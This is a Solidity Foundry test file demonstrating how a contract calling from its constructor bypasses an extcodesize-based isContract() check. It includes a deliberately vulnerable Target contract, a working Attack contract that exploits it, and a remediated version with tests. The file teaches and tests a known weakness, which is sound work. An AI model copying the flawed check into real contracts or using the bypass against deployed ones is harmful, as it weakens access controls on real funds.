// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

/*
Name: Bypass isContract() validation

Description:
The attacker only needs to write the code in the constructor of the smart contract 
to bypass the detection mechanism of whether it is a smart contract.

REF:
https://www.infuy.com/blog/bypass-contract-size-limitations-in-solidity-risks-and-prevention/
*/

contract ContractTest is Test {
    Target TargetContract;
    Attack AttackerContract;
    TargetRemediated TargetRemediatedContract;

    constructor() {
        TargetContract = new Target();
        TargetRemediatedContract = new TargetRemediated();
    }

    function testTargetAttackBug() public {
        AttackerContract = new Attack(address(TargetContract));
        assertEq(TargetContract.pwned(), true);
    }

    function testTargetAttackBugFixed() public {
        vm.expectRevert();
        AttackerContract = new Attack(address(TargetRemediatedContract));
    }
    receive() external payable {}
}

contract Target {
    function isContract(address account) public view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

contract Attack {
    bool public isContract;
    address public addr;

    // When contract is being created, code size (extcodesize) is 0.
    // This will bypass the isContract() check
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        // This will work
        Target(_target).protected();
    }
}

contract TargetRemediated {
    function isContract(address account) public view returns (bool) {
        require(tx.origin == msg.sender);
        return account.code.length > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}
